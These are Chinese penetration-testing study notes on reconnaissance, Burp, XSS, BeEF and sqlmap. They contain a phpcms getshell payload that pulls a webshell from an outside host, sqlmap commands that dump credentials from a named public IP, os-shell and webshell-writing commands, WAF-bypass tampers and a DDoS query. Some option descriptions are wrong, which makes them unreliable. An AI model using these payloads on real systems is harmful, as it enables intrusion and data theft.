+<p>​    301 301永久移动       401 Unauthorized：访问此文件需要身份验证</p>
+<p>​    403 Forbidden：请求有效但服务器拒绝响应</p>
+<p>Dirbuster是用来探测web目录结构和隐藏的敏感文件的</p>
+<p>​    —环境配置</p>
+<p>​       Dirbuster是基于java的应用程序需要Jre环境</p>
+<p>​       Java环境下载：<a target="_blank" rel="noopener" href="https://www.java.com/zh_CN/%EF%BC%88%E5%8A%A0%E8%BD%BD%E5%99%A8%EF%BC%89">https://www.java.com/zh_CN/（加载器）</a></p>
+<p>​       安装过程中一定要勾选“add to path”（添加环境变量）</p>
+<p>​       Dirbuster下载地址：<a target="_blank" rel="noopener" href="https://sourceforge.net/projects/dirbuster/files/">https://sourceforge.net/projects/dirbuster/files/</a></p>
+<p>​      安装：windows用户双击Dirbuster.jar启动软件（Linux用户在命令行运行./DirBuster-1.0-RC1.sh，若脚本无执行权限使用chmod +x ./DirBuster-1.0-RC1.sh添加权限）</p>
+<p>—操作步骤：1，URL设置；2.线程数设置；3.选择爆破字典；4.取消选择递归查询；5.开始运行。</p>
+<p>——安全工具：<a target="_blank" rel="noopener" href="https://habo.qq.com/tool/index">https://habo.qq.com/tool/index</a></p>
+<p>——信息安全，黑客工具：<a target="_blank" rel="noopener" href="https://www.ddosi.org/">https://www.ddosi.org/</a></p>
+<p>——CMS指纹识别</p>
+<p>​    CMS（内容管理系统）（content management system）快速搭建网站</p>
+<p>​    web应用框架（web application framework）快速二次开发的web应用框架，例如网站,小程序。</p>
+<p>​    —在线和离线的方式收集指纹信息</p>
+<p>\1.  云悉在线：<a target="_blank" rel="noopener" href="http://www.yunsee.cn/">http://www.yunsee.cn</a></p>
+<p>\2.  whatweb：<a target="_blank" rel="noopener" href="http://www.whatweb.net/">http://www.whatweb.net</a></p>
+<p>\3.  插件wappalyzer：<a target="_blank" rel="noopener" href="https://www.wappalyzer.com/">https://www.wappalyzer.com</a></p>
+<p>\4.  脚本CMSeek：<a target="_blank" rel="noopener" href="https://github.com/Tuhinshubhra/CMSeeK">https://github.com/Tuhinshubhra/CMSeeK</a></p>
+<p>Webfinger：<a target="_blank" rel="noopener" href="https://github.com/se55i0n/Webfinger">https://github.com/se55i0n/Webfinger</a></p>
+<p>​    —WAF：全称为web application firewall，是一款针对web应用攻击的防护产品。当web应用越来越丰富的同时，大部分交互都转移到了web上，与此同时web也成为了主要的攻击目标，此时waf就成为了安全防护中的第一道防线，waf在安全中的重要性不言而喻。</p>
+<p>​    —常见的WAF产品以及检测方法</p>
+<p>\1.  Awesome-WAF项目：<a target="_blank" rel="noopener" href="https://github.com/0xInfection/Awesome-WAF">https://github.com/0xInfection/Awesome-WAF</a></p>
+<p>\2.  检测脚本：wafw00f：<a target="_blank" rel="noopener" href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a></p>
+<p>—CND：全称是content delivery network，即内容分发网络。基本思路是尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈与环节，使内容传输得更快更稳定。</p>
+<p>​    使用在线以及离线的方式检测CDN:</p>
+<p>\1.  国内在线-CDN云测：<a target="_blank" rel="noopener" href="http://cdn.chinaz.com/">http://cdn.chinaz.com/</a></p>
+<p>\2.  国外在线-cdnplanet：<a target="_blank" rel="noopener" href="https://www.cdnplanet.com/">https://www.cdnplanet.com/</a></p>
+<p>\3.  脚本探测-xcdn：<a target="_blank" rel="noopener" href="https://github.com/3xp10it/xcdn">https://github.com/3xp10it/xcdn</a></p>
+<p>—常见绕过CDN的方法</p>
+<p>​    都是通过寻找对方未绑定CDN站点进行突破，从而找到真实站点。</p>
+<p>常见的寻找真实IP的方法：</p>
+<p>超级ping：<a target="_blank" rel="noopener" href="http://ping.chinaz.com/">http://ping.chinaz.com/</a></p>
+<p>历史解析：微步在线：<a target="_blank" rel="noopener" href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></p>
+<p>​           历史whois：<a target="_blank" rel="noopener" href="https://www.benmi.com/whoishistory/">https://www.benmi.com/whoishistory/</a></p>
+<p>​           历史托管：<a target="_blank" rel="noopener" href="https://toolbar.netcraft.com/site_report?url=">https://toolbar.netcraft.com/site_report?url=</a></p>
+<p>内部邮箱：对方发送邮件，查看邮箱来源IP。</p>
+<p>二级域名：寻找子域名找到未绑定的CDN站点。</p>
+<p>手机APP：使用Burp抓取手机APP数据包。</p>
+<p>微信公众号：使用Burp抓取微信公众号数据包。</p>
+<p>国外ping：ping.go：<a target="_blank" rel="noopener" href="http://www.ping.ge/">http://www.ping.ge</a></p>
+<p>​           海外测速：<a target="_blank" rel="noopener" href="http://tool.chinaz.com/speedworld/">http://tool.chinaz.com/speedworld/</a></p>
+<p>网络空间引擎：fofa：<a target="_blank" rel="noopener" href="https://fofa.so/">https://fofa.so</a></p>
+<p>CDN漏洞案例：CloudFlare防护下的破绽：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/41533.html">https://www.freebuf.com/articles/web/41533.html</a></p>
+<p>某运营商CDN配置系统弱口令：<a target="_blank" rel="noopener" href="http://suo.im/4EavrV">http://suo.im/4EavrV</a></p>
+<p>——web综合信息收集</p>
+<p>​    —实战信息收集-关于目标网站所有的信息</p>
+<p>​       目标站点； 目的：拿到webshell；</p>
+<p>脚本语言：php中间件：iis6.0，nginx；cms：phpcms V9.6.0</p>
+<p>漏洞利用文章：<a target="_blank" rel="noopener" href="http://blog.nsfocus.net/phpcms-v9-6-getshell-0day-vulnerability-analysis/">http://blog.nsfocus.net/phpcms-v9-6-getshell-0day-vulnerability-analysis/</a></p>
+<p>​    —相关工具</p>
+<p>​       payload：[siteid=1&amp;modelid=11&amp;username=saesvens1&amp;password=ssevses&amp;mail=<a href="mailto:&#115;&#115;&#101;&#118;&#x65;&#x6e;&#115;&#115;&#64;&#113;&#x71;&#46;&#x63;&#111;&#x6d;">&#115;&#115;&#101;&#118;&#x65;&#x6e;&#115;&#115;&#64;&#113;&#x71;&#46;&#x63;&#111;&#x6d;</a>&amp;info[content]= src=<a target="_blank" rel="noopener" href="http://a-1253363006.cos.ap-chengdu.myqcloud.com/shell.txt?.php#.jpg&gt;&amp;dosubmit=1&amp;protocol=">http://a-1253363006.cos.ap-chengdu.myqcloud.com/shell.txt?.php#.jpg&gt;&amp;dosubmit=1&amp;protocol=</a></p>
+<p>​       中国蚁剑：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq1045553189/article/details/87517612">https://blog.csdn.net/qq1045553189/article/details/87517612</a></p>
+<p>​       蚁剑目录：<a target="_blank" rel="noopener" href="https://github.com/AntSwordProject/antSword">https://github.com/AntSwordProject/antSword</a></p>
+<p>​       加速器：<a target="_blank" rel="noopener" href="https://github.com/AntSwordProject/AntSword-Loader">https://github.com/AntSwordProject/AntSword-Loader</a></p>
+<p>​       蚁剑安装流程：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36235492/article/details/85713821">https://blog.csdn.net/qq_36235492/article/details/85713821</a></p>
+<p>​      中国菜刀：<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80/3963062?FR=ALADDIN">https://baike.baidu.com/item/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80/3963062?FR=ALADDIN</a></p>
+<p>​       安装hackbar，社区搜索：<a target="_blank" rel="noopener" href="https://bbs.zkaq.cn/t/3750.html">https://bbs.zkaq.cn/t/3750.html</a></p>
+<h1 id="Web利用"><a href="#Web利用" class="headerlink" title="Web利用"></a>Web利用</h1><h2 id="Web漏洞扫描工具"><a href="#Web漏洞扫描工具" class="headerlink" title="Web漏洞扫描工具"></a>Web漏洞扫描工具</h2><p>——web漏洞扫描-简介</p>
+<p>\1.  漏洞扫描是指基于漏洞数据库，通过扫描等手段对指定的远程或者本地计算机系统的安全脆弱性进行检测，发现可利用漏洞的一种安全检测（渗透攻击）行为。</p>
+<p>\2.  web漏洞扫描器</p>
+<p>针对于web应用程序所开发的漏洞扫描器，例如SQL注入、XSS跨站脚本攻击等常见漏洞，进行主动式扫描探测是否存在漏洞。Web漏洞扫描器之间也有区别，例如对于XSS漏洞测试的扫描器，商业的漏洞扫描器和非商业性的漏洞扫描器。</p>
+<p>通过扫描器能够快速的发现漏洞，来提升我们的效率，以及漏洞覆盖面。</p>
+<p>web扫描器也是在为我们做信息收集、为接下来的渗透测试做准备。</p>
+<p>——AWVS简介</p>
+<p>​    Acunetix Web Vulnerability Scanner（简称AWVS）是一款知名的web网络漏洞扫描工具，它通过网络爬虫测试你的网站安全，检测流行安全漏洞。</p>
+<p>​    AWVS帮助我们快速发现漏洞并进行输出报告，来提高工作效率。</p>
+<p>——AWVS安装：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/chun-xiaolin001/p/10060830.html">https://www.cnblogs.com/chun-xiaolin001/p/10060830.html</a></p>
+<h2 id="WEB漏洞扫描器-AppScan"><a href="#WEB漏洞扫描器-AppScan" class="headerlink" title="WEB漏洞扫描器-AppScan"></a>WEB漏洞扫描器-AppScan</h2><p>​    AppScan，即AppScan standard edition。其安装在Windows操作系统上，可以对网站等web应用进行自动化的应用安全扫描和测试。</p>
+<p>​    Rational AppScan（简称AppScan）其实是一个产品家族，包括众多的应用安全扫描产品，从开发阶段的源代码扫描的AppScan source edition，到针对web应用进行快速扫描的AppScan standard edition，以及进行安全管理和汇总整合的AppScan enterprise Edition等。</p>
+<p>​    我们经常说的AppScan就是指的桌面版本的AppScan，即AppScan standard edition。其实装在windows上，也可以对网站等web应用进行自动化的安全扫描和测试。</p>
+<p>​    web扫描器也是在为我们做信息收集、为接下来的渗透测试做准备。</p>
+<h2 id="WEB漏洞扫描器-Burp-suite常规测试"><a href="#WEB漏洞扫描器-Burp-suite常规测试" class="headerlink" title="WEB漏洞扫描器-Burp suite常规测试"></a>WEB漏洞扫描器-Burp suite常规测试</h2><p>——简介</p>
+<p>​    Burp Suite是一个集成化的渗透测试工具，它集合了多种渗透测试组件，使我们自动化地或手工的完成对web应用的渗透测试和攻击。在渗透测试中，我们使用Burp Suite将使得测试工作变得更加容易和方便，即使在不需要娴熟的技巧的情况下，只要熟悉使用Burp Suite，也使得渗透测试工作变得轻松和高效。</p>
+<p>​    Burp Suite是用于攻击web应用程序的集成平台，包含了许多工具。Burp Suite为这些工具设计了很多接口，以加速攻击应用程序的过程。所有工具都共享一个请求，并能处理对应的HTTP消息、持久性、认证、代理、日志、警报。</p>
+<p>​    Burp Suite是渗透测试人员在工作中最常用的工具，用来分析数据包进行测试。</p>
+<p>——原理</p>
+<p>​    浏览器和相关应用程序的中间拦截、修改、重放数据包的代理工具。</p>
+<p>——安装配置</p>
+<p>\1.  安装JAVA 64位环境：<a target="_blank" rel="noopener" href="https://www.java.com/zh_CN/download/">https://www.java.com/zh_CN/download/</a></p>
+<p>\2.  安装jyphon环境jar版本：<a target="_blank" rel="noopener" href="https://www.jython.org/download.html">https://www.jython.org/download.html</a></p>
+<p>\3.  安装Jruby环境jar版本：<a target="_blank" rel="noopener" href="https://www.jruby.org/download">https://www.jruby.org/download</a></p>
+<p>\4.  设置浏览器代理</p>
+<p>\5.  导入HTTPS证书</p>
+<p>—常用的模块</p>
+<p>\1.  Burp Target；2. Burp Proxy; 3. Burp Intruder; 4. Burp Repeater; 5. Burp Extender</p>
+<h2 id="Burpsuite-插件利用检测"><a href="#Burpsuite-插件利用检测" class="headerlink" title="Burpsuite-插件利用检测"></a>Burpsuite-插件利用检测</h2><p>——Sqlmap插件安装</p>
+<p>\1.  安装python环境； 2. 安装sqlmap；3. 添加环境变量；4. 下载sqlmap.jar扩展包：<a target="_blank" rel="noopener" href="http://pan.baidu.com/s/1skDVwa5">http://pan.baidu.com/s/1skDVwa5</a> 密码ce5f；5. burp加载插件。</p>
+<p>——xss插件安装</p>
+<p>\1.  Phantomjs下载：<a target="_blank" rel="noopener" href="http://phantomjs.org/download.html">http://phantomjs.org/download.html</a> 配置环境变量，把bin目录下的exe加入环境变量，文件放在python目录下</p>
+<p>\2.  安装xssValidator BApp Store</p>
+<p>\3.  下载xss.js下载地址：<a target="_blank" rel="noopener" href="https://github.com/nVisium/xssValidator">https://github.com/nVisium/xssValidator</a></p>
+<p>\4.  利用phantomjs运行xss.js C:\xss\phantomjs-2.1.1-windows\bin&gt;phantomjsxss.js</p>
+<p>——xss插件和Burp使用</p>
+<p>\1.  配置插件；2. 抓包发送到Intruder；3. 配置payloads为xssValidator；4. 配置Intruder option的grep -match；5. 开始</p>
+<p>——开源的插件项目</p>
+<p>​    Burp Suite的强大除了自身提供了丰富的可供测试人员使用的功能外，其提供的第三方拓展插件的功能也极大的方便使用者编写自己的自定义插件。它支持的插件类型有java，python，ruby，三种。无论哪种语言的实现，开发者只要选择自己熟悉的语言，按照接口规范去实现想要的功能即可。</p>
+<p>1．     BApp store插件商店下载；2. 开源插件项目github：<a target="_blank" rel="noopener" href="https://github.com/search?utf8=%E2%9C%93%25q=burp">https://github.com/search?utf8=%E2%9C%93%q=burp</a></p>
+<h2 id="xss漏洞初步学习"><a href="#xss漏洞初步学习" class="headerlink" title="xss漏洞初步学习"></a>xss漏洞初步学习</h2><p>——xss简介</p>
+<p>​    XSS跨站脚本攻击（Cross Site Scripting），是将java script代码插入web页面中，之后当用户浏览页面时，会执行嵌套在web页面里面的java script代码，从而达到攻击用户的目的。为了跟html里面的层叠样式表（CSS，Cascading Style Sheets）作区分，所以叫作XSS。</p>
+<p>​    注入攻击的本质，是吧用户输入的数据当作代码执行。</p>
+<p>​    这里有两个关键条件：1. 用户能够控制输入；2. 原本程序要执行的代码，拼接了用户输入的数据。</p>
+<p>——原理</p>
+<p>​    XXS主要拼接什么：SQL注入拼接的是操作数据库的SQL语句。XSS拼接的是网页的html代码，一般而言我们是可以拼接出合适的html代码去执行恶意的JS语句（总结：xss就是拼接恶意的html，执行并能够成功解析）</p>
+<p>​    xss的危害：盗取Cookie（用的最频繁的）；盗取内网ip；获取浏览器保存的明文密码；截取网页屏幕；网页上的键盘记录。</p>
+<p>——种类</p>
+<p>​    反射型：你提交的数据成功的实现了XSS，但是仅仅是对你这次访问产生了影响，是非持久性攻击。</p>
+<p>​    存储型XSS（持久性）：你提交的数据成功的实现了XSS，存入了数据库，别人访问这个页面的时候就会自动触发。</p>
+<p>​    DOM型XSS：DOM（document object model 文本对象模型），客户端脚本处理逻辑导致的安全问题。</p>
+<p>——XSS平台</p>
+<p>​    <a target="_blank" rel="noopener" href="http://xss.tf/">http://xss.tf/</a>      <a target="_blank" rel="noopener" href="https://xsspt.com/index.php?do=login">https://xsspt.com/index.php?do=login</a> 或搜索引擎搜索</p>
+<p>​    XSS平台方便了XSS攻击，只需要引入一个平台外部链接就可以实现各种功能。</p>
+<p>——挑战实例</p>
+<p>​    360插件：xss插件扫描Okee.360.cn</p>
+<p>​    更多工具：<a target="_blank" rel="noopener" href="https://github.com/rajeshmajumdar/BruteXSS">https://github.com/rajeshmajumdar/BruteXSS</a></p>
+<h2 id="beef-XSS"><a href="#beef-XSS" class="headerlink" title="beef-XSS"></a>beef-XSS</h2><p>——简介</p>
+<p>​    beef（The Browser Exploitation Framework）；一款浏览器攻击框架，用rubby语言开发的，kali中默认安装的一个模块，用于实现对XSS漏洞的攻击和利用。</p>
+<p>​    beef主要是往网页中插入一段名为hook.js的JS脚本代码，如果浏览器访问了有hook.js（钩子）的页面，就会被hook（钩住），勾连的浏览器会执行初始代码返回一些信息，接着目标主机会每隔一段时间（默认为1秒）向beef服务器发送一个请求，询问是否有新的代码需要执行。beef浏览器本质上就像一个web应用，被分为前端和后端。前端会轮询后端是否有新的数据需要更新，同时前端也可以向后端发送指示，beef持有者可以通过浏览器来登录beef的后端，来控制前端（用户的浏览器）。beef一般和XSS漏洞结合使用。</p>
+<p>​    —打开方式</p>
+<p>\1.  直接点击桌面上的图标，过5秒左右，然后它会自动打开命令行和浏览器beef的登录框</p>
+<p>\2.  任意目录，直接输入命令：beef-xss打开，过5秒左右，然后会自动打开命令行和beef浏览器的登录框</p>
+<p>\3.  进入/usr/share/beef-xss/，输入命令：./beef打开，然后手动打开浏览器链接。</p>
+<p>—配置</p>
+<p>​    修改默认密码：vim /etc/beef-xss/config.yaml 修改配置文件</p>
+<p>​    测试界面：<a target="_blank" rel="noopener" href="https://127.0.0.1:3000/demos/butcher/index.html">https://127.0.0.1:3000/demos/butcher/index.html</a></p>
+<h2 id="sqlmap之sql注入原理利用"><a href="#sqlmap之sql注入原理利用" class="headerlink" title="sqlmap之sql注入原理利用"></a>sqlmap之sql注入原理利用</h2><p>——简介</p>
+<p>​    SQL注入就是把SQL命令插入到web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意的）SQL命令注入到后台数据库引擎执行的能力，它可以通过在web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句的。</p>
+<p>​    攻击者通过构造不同的SQL语句来实现对数据库的操作。</p>
+<p>​    关键条件：1. 参数用户可控；2. 参数带入数据库查询。</p>
+<p>​    —SqlMap-开源渗透测试工具</p>
+<p>\1.  开源的渗透测试工具、自动化检测和利用SQL注入漏洞</p>
+<p>\2.  支持对多种数据库进行注入测试</p>
+<p>\3.  支持多种注入技术，例如，盲注、时间延时注入、报错注入</p>
+<p>\4.  支持枚举用户数据库信息，例如，用户名、密码</p>
+<p>\5.  自动识别哈希密码，并且使用密码字典进行破解</p>
+<p>sqlmap是渗透测试人员对sql注入漏洞进行检测的最佳工具</p>
+<p>——sqlmap安装</p>
+<p>\1.  工具地址：<a target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a></p>
+<p>\2.  安装配置：<a target="_blank" rel="noopener" href="https://www.python.org/downloads/windows/">https://www.python.org/downloads/windows/</a></p>
+<p>\3.  python2和python3共存：<a target="_blank" rel="noopener" href="https://www.zkaq.org/t/3572.html">https://www.zkaq.org/t/3572.html</a></p>
+<p>——sqlmap注入流程</p>
+<p>\1.  判断sql注入点；2. 查询数据库信息；3. 根据数据库查询数据表；4. 根据数据表查询列信息。</p>
+<p>——sqlmap测试流程</p>
+<p>\1.  检测是否存在注入点</p>
+<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://117.41.229.122:8840/single.php?id=1%E2%80%9D">http://117.41.229.122:8840/single.php?id=1”</a></p>
+<p>\2.  检测数据库信息</p>
+<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://117.41.229.122:8840/single.php?id=1%E2%80%9D">http://117.41.229.122:8840/single.php?id=1”</a> –dbs</p>
+<p>\3.  通过数据库查询数据表信息</p>
+<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://117.41.229.122:8840/single.php?id=1%E2%80%9D">http://117.41.229.122:8840/single.php?id=1”</a> -D cake –tables</p>
+<p>\4.  通过数据表查询查询字段信息</p>
+<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://117.41.229.122:8840/single.php?id=1%E2%80%9D">http://117.41.229.122:8840/single.php?id=1”</a> -D cake –T user –columns</p>
+<p>\5.  通过字段枚举字段内容</p>
+<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://117.41.229.122:8840/single.php?id=1%E2%80%9D">http://117.41.229.122:8840/single.php?id=1”</a> -D cake –T user -C “username.password” -dump</p>
+<p>——sqlmap命令操作</p>
+<p>\1.  查看数据库相关信息</p>
+<p>–current-user      枚举当前用户</p>
+<p>–dbs             枚举当前数据库</p>
+<p>–is-dba           枚举可用的数据库</p>
+<p>–passwords       枚举数据库权限</p>
+<p>​    \2. 指纹识别</p>
+<p>​       -f                启用广泛的数据识别</p>
+<p>​       -b                检测数据库指纹</p>
+<p>​       –hostname       枚举主机名称</p>
+<p>​    \3. Waf识别</p>
+<p>​       –identify-waf     检测waf信息</p>
+<p>——sqlmap更新</p>
+<p>​    python sqlmap.py –update</p>
+<h2 id="sqlmap之sql注入一"><a href="#sqlmap之sql注入一" class="headerlink" title="sqlmap之sql注入一"></a>sqlmap之sql注入一</h2><p>——常见的注入方式</p>
+<p>\1.  用于access数据库注入；2. 用于cookie注入；3. post注入；4. mysql注入</p>
+<p>常见SQLmap使用方法：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/hack404/p/10830239.html">https://www.cnblogs.com/hack404/p/10830239.html</a></p>
+<p>​                      <a target="_blank" rel="noopener" href="https://www.cnblogs.com/ichunqiu/p/5805108.html">https://www.cnblogs.com/ichunqiu/p/5805108.html</a></p>
+<h1 id="一、SQLMAP用于Access数据库注入"><a href="#一、SQLMAP用于Access数据库注入" class="headerlink" title="一、SQLMAP用于Access数据库注入"></a>一、SQLMAP用于Access数据库注入</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py-u&quot;`http://www.xxx.com/en/CompHonorBig.asp?id=7`&quot;</span><br><span class="line">python sqlmap.py-u&quot;`http://www.xxx.com/en/CompHonorBig.asp?id=7`&quot;` `--tables</span><br><span class="line">python sqlmap.py-u&quot;`http://www.xxx.com/en/CompHonorBig.asp?id=7`&quot;` `--columns -T admin</span><br><span class="line">python sqlmap.py-u&quot;`http://www.xxx.com/en/CompHonorBig.asp?id=7`&quot;` `--dump -T admin -C &quot;username,password&quot;</span><br></pre></td></tr></table></figure>
+
+<h1 id="二、SQLMAP用于Cookie注入"><a href="#二、SQLMAP用于Cookie注入" class="headerlink" title="二、SQLMAP用于Cookie注入"></a>二、SQLMAP用于Cookie注入</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py-u&quot;`http://www.xxx.org/jsj/shownews.asp`&quot;` `--cookie &quot;id=31&quot; --table --level 2</span><br><span class="line">python sqlmap.py-u&quot;`http://www.xxx.org/jsj/shownews.asp`&quot;` `--cookie &quot;id=31&quot; --columns -T</span><br><span class="line">python sqlmap.py-u&quot;`http://www.xxx.org/jsj/shownews.asp`&quot;` `--cookie &quot;id=31&quot; --dump -T</span><br></pre></td></tr></table></figure>
+
+<h1 id="三、SQLMAP用于mysql中DDOS攻击"><a href="#三、SQLMAP用于mysql中DDOS攻击" class="headerlink" title="三、SQLMAP用于mysql中DDOS攻击"></a>三、SQLMAP用于mysql中DDOS攻击</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py-u [url]http://192.168.159.1/news.php?id=1[/url]--sql-shell</span><br><span class="line">select` `benchmark(99999999999,0x70726f62616e646f70726f62616e646f70726f62616e646f)</span><br></pre></td></tr></table></figure>
+
+<h1 id="四、SQLMAP用于mysql注入"><a href="#四、SQLMAP用于mysql注入" class="headerlink" title="四、SQLMAP用于mysql注入"></a>四、SQLMAP用于mysql注入</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py-u&quot;`http://www.xxx.com/link.php?id=321`&quot;` `--dbs</span><br><span class="line">python sqlmap.py-u&quot;`http://www.xxx.com/link.php?id=321`&quot;` `-D dataname--tables</span><br><span class="line">python sqlmap.py-u&quot;`http://www.xxx.com/link.php?id=321`&quot;` `-D dataname-T table_name--columns</span><br><span class="line">python sqlmap.py-u&quot;`http://www.xxx.com/link.php?id=321`&quot;` `-D dataname-T table_name-C &quot;id,user,password&quot;` `--dump</span><br></pre></td></tr></table></figure>
+
+<h1 id="五、SQLMAP中post登陆框注入"><a href="#五、SQLMAP中post登陆框注入" class="headerlink" title="五、SQLMAP中post登陆框注入"></a>五、SQLMAP中post登陆框注入</h1><p>\1. 浏览器打开目标地址http:// <a target="_blank" rel="noopener" href="http://www.xxx.com/">www.xxx.com</a> /Login.asp</p>
+<p>\2. 配置burp代理(127.0.0.1:8080)以拦截请求</p>
+<p>\3. 点击login表单的submit按钮</p>
+<p>\4. 这时候Burp会拦截到了我们的登录POST请求</p>
+<p>\5. 把这个post请求复制为txt, 我这命名为search-test.txt 然后把它放至sqlmap目录下</p>
+<p>\6. 运行sqlmap并使用如下命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./sqlmap.py -r search-test.txt -p tfUPass</span><br></pre></td></tr></table></figure>
+
+<p>自动搜索注入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap-u [url]http://testasp.vulnweb.com/Login.asp[/url]--forms</span><br></pre></td></tr></table></figure>
+
+<p>指定参数注入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap-u [url]http://testasp.vulnweb.com/Login.asp[/url]--data &quot;tfUName=321&amp;tfUPass=321&quot;</span><br></pre></td></tr></table></figure>
+
+<h1 id="六、SQLMAP中Google搜索注入"><a href="#六、SQLMAP中Google搜索注入" class="headerlink" title="六、SQLMAP中Google搜索注入"></a>六、SQLMAP中Google搜索注入</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap-g inurl:php?id=</span><br></pre></td></tr></table></figure>
+
+<h1 id="七、SQLMAP中的请求延迟"><a href="#七、SQLMAP中的请求延迟" class="headerlink" title="七、SQLMAP中的请求延迟"></a>七、SQLMAP中的请求延迟</h1><p>参数 –delay –safe-freq</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py--dbs -u &quot;`http://xxx.cn/index.php/Index/view/id/40.html`&quot; --delay 1</span><br><span class="line">python sqlmap.py--dbs -u &quot;`http://xxx.cn/index.php/Index/view/id/40.html`&quot; --safe-freq 3</span><br></pre></td></tr></table></figure>
+
+<h1 id="八、SQLMAP绕过WAF防火墙"><a href="#八、SQLMAP绕过WAF防火墙" class="headerlink" title="八、SQLMAP绕过WAF防火墙"></a>八、SQLMAP绕过WAF防火墙</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*sqlmap-u [url]http://192.168.159.1/news.php?id=1[/url]-v3*` `*--dbs --batch --tamper &quot;space2morehash.py&quot;*</span><br></pre></td></tr></table></figure>
+
+<p>space2morehash.py中可以替换space2hash.py或者base64encode.py或者charencode.py</p>
+<p>都是编码方式</p>
+<p>space2hash.py base64encode.py charencode.py</p>
+<h1 id="九、SQLMAP查看权限"><a href="#九、SQLMAP查看权限" class="headerlink" title="九、SQLMAP查看权限"></a>九、SQLMAP查看权限</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap-u [url]http://192.168.159.1/news.php?id=1[/url]--privileges</span><br></pre></td></tr></table></figure>
+
+<h1 id="十、SQLMAP伪静态注入-1-查找数据库"><a href="#十、SQLMAP伪静态注入-1-查找数据库" class="headerlink" title="十、SQLMAP伪静态注入(1) 查找数据库"></a>十、SQLMAP伪静态注入(1) 查找数据库</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py-u&quot;`http://xxx.cn/index.php/Index/view/id/40.html`&quot;` `--dbs</span><br><span class="line">python sqlmap.py-u&quot;`http://xxx.cn/index.php/Index/view/id/40.html`&quot;` `-D dataname--tables</span><br><span class="line">python sqlmap.py-u&quot;`http://xxx.cn/index.php/Index/view/id/40.html`&quot;` `-D dataname-T tablename--columns</span><br><span class="line">python sqlmap.py -u &quot;`http://xxx.cn/index.php/Index/view/id/40.html`&quot;` `-D dataname -T *tablename -C &quot;password&quot;*` `*--dump*</span><br></pre></td></tr></table></figure>
+
+<h1 id="十一、SQLMAP注入点执行命令与交互写shell"><a href="#十一、SQLMAP注入点执行命令与交互写shell" class="headerlink" title="十一、SQLMAP注入点执行命令与交互写shell"></a>十一、SQLMAP注入点执行命令与交互写shell</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*sqlmap-u [url]http://192.168.159.1/news.php?id=1[/url]--os-cmd=ipconfig*</span><br><span class="line">sqlmap-u [url]http://192.168.159.1/news.php?id=1[/url]--os-shell</span><br></pre></td></tr></table></figure>
+
+<p>–file-read=RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径）</p>
+<p>–file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）</p>
+<p>–file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap-r “c:\request.txt”-pid` `–dbms mysql –file-dest “e:\php\htdocs\dvwa\inc\include\1.php” –file-write` `“f:\webshell\1112.php”</span><br><span class="line"> </span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+
+<p>——常见测试参数</p>
+<p>\1.  指定参数进行测试</p>
+<p>参数：*号，和-p选项</p>
+<p>\2.  使用post方式提交注入：参数：–data选项</p>
+<p>\3.  sqlmap扫描等级（1-5）</p>
